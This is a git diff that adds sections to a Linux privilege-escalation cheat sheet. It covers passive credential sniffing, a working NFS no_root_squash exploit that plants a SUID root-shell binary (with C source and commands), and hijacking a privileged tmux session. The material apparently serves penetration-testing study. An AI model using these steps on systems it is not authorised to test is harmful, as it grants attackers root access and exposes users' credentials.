@@ -233,3 +233,62 @@ spec:
 ```
 > This pod YAML allows us to mount the root directory of the node
 
+## Passive Traffic Capture for Credentials
+We can use a tool like `tcpdump` or [net-creds](https://github.com/DanMcInerney/net-creds) or [PCredz](https://github.com/lgandx/PCredz) to look for plaintext credentials or sensitive information over the network.
+
+## Weak NFS Privileges
+We can view all Network File Shares on a server's export list with `showmount -e [ip]`. When setting up an NFS volume, various options can be set, some of which affect the security:
+- `root_squash` : Changes the root user (if used to access the share) to `nfsnobody` which is an underprivileged account. This means that an attacker can't upload binaries with the SUID bit set as it will be owned by the `nfsnobody` user instead.
+- `no_root_squash` : This allows remote users to connect to the share as the local root user. Allowing the upload of malicious files with the SUID bit set.
+
+```bash
+cat /etc/exports
+```
+
+We can use this to create a malicious file:
+1. Create a binary with the SETUID bit as our local root user.
+2. Mount an NFS directory from the remote server that has `no_root_squash`.
+3. Copy our binary to the mount.
+4. Set the SUID bit
+
+```bash
+$ cat shell.c 
+
+#include <stdio.h> 
+#include <sys/types.h> 
+#include <unistd.h> 
+#include <stdlib.h> 
+int main(void) 
+{ 
+	setuid(0); 
+	setgid(0); 
+	system("/bin/bash"); 
+}
+
+$ gcc shell.c -o shell
+$ sudo mount -t nfs [ip]:/tmp /mnt
+$ cp shell /mnt
+$ chmod u+s /mnt/shell
+```
+Then we can switch back to the target on a low privileged session and execute the binary to obtain the root shell.
+
+## Hijacking Tmux Sessions
+Some user's may leave privileged tmux sessions detached that we could hijack.
+
+Eg. a new shared session with a modified ownership could exist.
+```bash
+tmux -S /shareds new -s debugsess
+chown root:devs /shareds
+```
+
+If we compromised a user in the `devs` group, we could steam this session.
+```bash
+# Check for tmux sessions
+ps aux | grep tmux
+
+# Confirm permissions
+ls -la /shareds
+
+# Steal session
+tmux -S /shareds
+```
